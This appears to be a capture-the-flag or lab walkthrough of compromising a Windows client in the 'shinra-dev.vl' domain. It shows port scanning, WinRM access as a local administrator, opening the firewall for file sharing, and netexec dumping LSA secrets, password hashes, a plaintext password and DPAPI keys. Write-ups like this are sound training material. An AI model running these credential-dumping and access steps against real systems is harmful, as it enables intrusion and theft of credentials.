As usual I will start by checking all the open services on this machine via Rustscan:

```bash
PORT     STATE SERVICE       REASON         VERSION
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
| ssl-cert: Subject: commonName=client03.shinra-dev.vl
| Issuer: commonName=client03.shinra-dev.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-05T07:10:30
| Not valid after:  2026-05-07T07:10:30
| MD5:     4f15 4f77 e38b 0fd1 1f0d 2b8d 342e ec81
| SHA-1:   ded4 a14f a9f1 946e 843a 8f17 10e2 9f3b 685f fa2b
| SHA-256: e1a8 1873 197b faae c6ba 3088 aae6 d51a 2cdc dca0 e9b3 d7e7 ff7c 9594 6453 6e87
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQL3Tf8bnEb55GljUhpeOvETANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZjbGllbnQwMy5zaGlucmEtZGV2LnZsMB4XDTI1MTEwNTA3MTAz
| MFoXDTI2MDUwNzA3MTAzMFowITEfMB0GA1UEAxMWY2xpZW50MDMuc2hpbnJhLWRl
| di52bDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANw/ffy6WxL++l8j
| NMVYDzmKohfD8TpmivOOQzBAehAoDNM9GuCOQpgwJYke+Lb9nTX/eq3Soyk0EzHN
| SfmT5LJneRp6aClM4c9flH4fEq/aphRTwXBqsKVBQz/le46XDU2Fk/VkHZdhwCkL
| 6rYZKX4UBQjFj7Mfjmy50WqAHG2zBJygY72HBafvvkky5FSn9fmObofUepLUN4yA
| +KeM7Qp9W0MNBBS2tesVWZekgkOU/TpIHgLmRuhQ0FX3KHEFSwsE65TaRZW0Not1
| QOeoFjNb+a/Uh69ZUJ54aFLz20ZsUJ0cV3YZtdbzH6DNvGM9ToEpfMxWArqzEUyA
| tdpDSX0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQC71N7MKKVoWe2JNGB9vIa8YP2bdhCXhLXVEv2Q
| YhCZyE5HA1jh2ETACm4P7qT75P+FbIudetE1Z57ZGPOLTkL9SaaONXfrs6pPkjj5
| DcRIeFhdNqxffxUIY+tUqtKrdoCJltg+CFIglHDIGG07YdncjYeaCK7cLXbVER0Q
| PyeTUl2GSsd1Gx5lb5UdzkOk/kaCB+j00FGibS3WrvOF20ipCsH4DQ2wwEvZr7RP
| 3DI+7GM0ilXVTwKrk4Qyx0jLvBh8Ms00ISY1XXDLQ7Ai+TSanA01Su9Gd/RrlvoV
| KBUbEcoTIdK+l9+u030UG5MhC4kt91X70bNGkkDotT+t/8Ah
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: SHINRA-DEV
|   NetBIOS_Domain_Name: SHINRA-DEV
|   NetBIOS_Computer_Name: CLIENT03
|   DNS_Domain_Name: shinra-dev.vl
|   DNS_Computer_Name: client03.shinra-dev.vl
|   DNS_Tree_Name: shinra-dev.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2026-03-25T12:09:14+00:00
|_ssl-date: 2026-03-25T12:09:28+00:00; -1s from scanner time.
5040/tcp open  unknown       syn-ack ttl 64
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/25%OT=135%CT=%CU=%PV=Y%G=N%TM=69C3D07A%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%TS=A)
SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=N)

Uptime guess: 9.686 days (since Sun Mar 15 20:41:54 2026)
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

```

# WINRM

With Netexec I can see it fails to footprint the success of Conor loggin into WINRM:

```bash
└─$ netexec winrm 11_hosts.txt -u Conor.Brown --use-kcache -k    
WINRM       172.16.11.10    5985   CLIENT01         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT01) (domain:shinra-dev.vl) 
WINRM       172.16.11.50    5985   FILE01           [*] Windows 10 / Server 2019 Build 17763 (name:FILE01) (domain:shinra-dev.vl) 
WINRM       172.16.11.80    5985   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:shinra.vl) 
WINRM       172.16.11.101   5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:shinra-dev.vl) 
WINRM       172.16.11.12    5985   CLIENT03         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT03) (domain:shinra-dev.vl) 
Running nxc against 10 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

But it actually works:

```bash
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ evil-winrm -i CLIENT03.shinra-dev.vl -r shinra-dev.vl
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\conor.brown\Documents> 


```

And seems like he is part of the local administrators:

```bash
evil-winrm-py PS C:\Users\Administrator\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
SHINRA-DEV\Conor.Brown
SHINRA-DEV\Domain Admins
The command completed successfully.



```

And it gets a flag:

```bash
evil-winrm-py PS C:\Users\Administrator\Desktop> cat flag.txt
SHINRA{961b1a7cd376704f02cc047a687dba25}
evil-winrm-py PS C:\Users\Administrator\Desktop>

```

I will temporarly enable the samba so I can use netexec to dump everything:

```bash
evil-winrm-py PS C:\Users\Administrator\Documents> Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"
evil-winrm-py PS C:\Users\Administrator\Documents>

```

And dump more credentials:

```bash
└─$ netexec smb 172.16.11.12 -u Conor.Brown --use-kcache  --lsa --dpapi
SMB         172.16.11.12    445    CLIENT03         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT03) (domain:shinra-dev.vl) (signing:False) (SMBv1:None)
SMB         172.16.11.12    445    CLIENT03         [+] SHINRA-DEV.VL\Conor.Brown from ccache (Pwn3d!)
SMB         172.16.11.12    445    CLIENT03         [+] Dumping LSA secrets
SMB         172.16.11.12    445    CLIENT03         SHINRA-DEV.VL/Conor.Brown:$DCC2$10240#Conor.Brown#cd1ff685eb0824ff1c7fb2f2898e75f2: (2026-03-25 03:46:34)
SMB         172.16.11.12    445    CLIENT03         SHINRA-DEV.VL/Administrator:$DCC2$10240#Administrator#354886cd3559a0d6bcbb2164d7a07cb4: (2025-06-08 01:26:37)
SMB         172.16.11.12    445    CLIENT03         SHINRA-DEV\CLIENT03$:plain_password_hex:c4027758a144cc059a3917fefe1d26c21c71bfd599e82f4584121298bce57a1eeb051b22b73311cd3bc5bfd85a836af0c7225c28262b7f6dba778cc29bd888117a32bce2285d8128f07ed1fc8f22be3f87a86fc7b061d19acea9e5ccdc9066f2a90fa39ebe7d3205c53cb896593a1e7399744f35b28f120536dd2f0dae7901d8d0c854c70a8bc8c258ce0abfa86af78cb414c69c765c80001b70382a202d49c1cbc6409c90d2a64c29015f85cbca5a0f2f68fad849f33dee2a1f54a5693d48398845677963e6dcf560bfef6e14fc6417c9d13329c09579c0ad174c182c3a0e1e02caaeeeeaade773e0c5919611fd1ef2
SMB         172.16.11.12    445    CLIENT03         SHINRA-DEV\CLIENT03$:aad3b435b51404eeaad3b435b51404ee:c0dd656d3b9c25d4dd989228143001c4:::
SMB         172.16.11.12    445    CLIENT03         shinra-dev.vl\conor.brown:4+9ZDRYdzfadGo
SMB         172.16.11.12    445    CLIENT03         dpapi_machinekey:0xdf646cbeb7ab94fcc261d0377a6b1555537e2622
dpapi_userkey:0xa4df9563ba7041067eef023bbc534c3332587381
SMB         172.16.11.12    445    CLIENT03         [+] Dumped 6 LSA secrets to /home/user/.nxc/logs/lsa/172.16.11.12_None_2026-03-25_134932.secrets and /home/user/.nxc/logs/lsa/172.16.11.12_None_2026-03-25_134932.cached
SMB         172.16.11.12    445    CLIENT03         [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         172.16.11.12    445    CLIENT03         [+] Got 9 decrypted masterkeys. Looting secrets...

```

Now if the flow is same I suspect I need to dig the Jupiter data where I will most likely get the clue to the next step it might be inside the notebook?

```bash
vil-winrm-py PS C:\Users\conor.brown\.vscode\extensions\ms-toolsai.jupyter-2021.8.1236758218> ls


    Directory: C:\Users\conor.brown\.vscode\extensions\ms-toolsai.jupyter-2021.8.1236758218


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----        12/21/2022   3:29 AM                out                                                                   
d-----        12/21/2022   3:29 AM                pythonFiles                                                           
d-----        12/21/2022   3:29 AM                resources                                                             
d-----        12/21/2022   3:29 AM                snippets                                                              
-a----        12/21/2022   3:29 AM           3080 .vsixmanifest                                                         
-a----        12/21/2022   3:29 AM          49147 CHANGELOG.md                                                          
-a----        12/21/2022   3:29 AM          75209 icon.png                                                              
-a----        12/21/2022   3:29 AM           2594 INTERACTIVE_TROUBLESHOOTING.md                                        
-a----        12/21/2022   3:29 AM           1095 LICENSE.txt                                                           
-a----        12/21/2022   3:29 AM          84925 package.json                                                          
-a----        12/21/2022   3:29 AM             82 package.nls.it.json                                                   
-a----        12/21/2022   3:29 AM          43093 package.nls.json                                                      
-a----        12/21/2022   3:29 AM           6128 package.nls.nl.json                                                   
-a----        12/21/2022   3:29 AM           1663 package.nls.pl.json                                                   
-a----        12/21/2022   3:29 AM           1175 package.nls.ru.json                                                   
-a----        12/21/2022   3:29 AM          38286 package.nls.zh-cn.json                                                
-a----        12/21/2022   3:29 AM           1407 package.nls.zh-tw.json                                                
-a----        12/21/2022   3:29 AM           9940 README.md                                                             
-a----        12/21/2022   3:29 AM            210 requirements.txt                                                      
-a----        12/21/2022   3:29 AM           2825 SECURITY.md                                                           
-a----        12/21/2022   3:29 AM        1530317 ThirdPartyNotices-Distribution.txt                                    
-a----        12/21/2022   3:29 AM          51657 ThirdPartyNotices-Repository.txt                                      
-a----        12/21/2022   3:29 AM         555208 vscode.d.ts                                                           
-a----        12/21/2022   3:29 AM         115124 vscode.proposed.d.ts   
```

Now I see a noteboot:

```bash
vil-winrm-py PS C:\Users\conor.brown> cd ..
evil-winrm-py PS C:\Users> Get-ChildItem -Path C:\Users\conor.brown -Filter *.ipynb -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\conor.brown\.vscode\extensions\ms-toolsai.jupyter-2021.8.1236758218\pythonFiles


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----        12/21/2022   3:29 AM          16147 Notebooks intro.ipynb            
```

But that is the defaul one from the VSCode so I will upload Linpeas and check more.

```
//Bash history might contain interesting data
 Directory of C:\Users\conor.brown\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

03/25/2026  11:09 AM           217,105 ConsoleHost_history.txt
               1 File(s)        217,105 bytes
               0 Dir(s)   2,794,618,880 bytes free


```

And seems like there is an old share on the machine?

```bash
l-winrm-py PS C:\Temp> net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
Unavailable  Z:        \\client04.shinra-dev.vl\workspace 
                                                Microsoft Windows Network
The command completed successfully.

```

But it is not accessible and checking the notes I see the lab might be broken? I will move on to the other client.